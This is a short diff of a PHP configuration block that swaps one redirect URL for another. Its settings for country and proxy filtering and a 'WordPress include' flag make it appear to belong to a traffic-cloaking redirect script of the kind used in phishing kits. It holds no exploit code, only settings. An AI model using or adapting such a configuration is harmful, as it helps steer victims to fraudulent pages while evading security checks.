@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://thevegansnation.com/?zbsirmbw";
+$redirect = "https://colegiointeragirfsa.com/zo/hfjfh/jdjdj";
 
 $parameter = 4; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
